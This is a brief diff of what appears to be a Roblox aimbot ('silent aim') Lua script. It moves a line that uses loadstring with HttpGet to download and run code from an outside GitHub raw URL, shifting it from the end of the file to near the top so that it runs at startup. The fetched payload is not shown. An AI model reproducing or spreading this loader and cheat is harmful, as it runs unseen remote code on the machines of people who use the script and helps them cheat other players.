@@ -43,6 +43,9 @@ getgenv().extort = {
 }
 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripade/sh/refs/heads/main/Wsvr.txt"))()
+
+
 
 
 local SilentAimFOVCircle = Drawing.new("Circle")
@@ -507,10 +510,4 @@ end)
             end
         end
     end
-end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scripade/sh/refs/heads/main/Wsvr.txt"))()
-
-  end
- end
 end
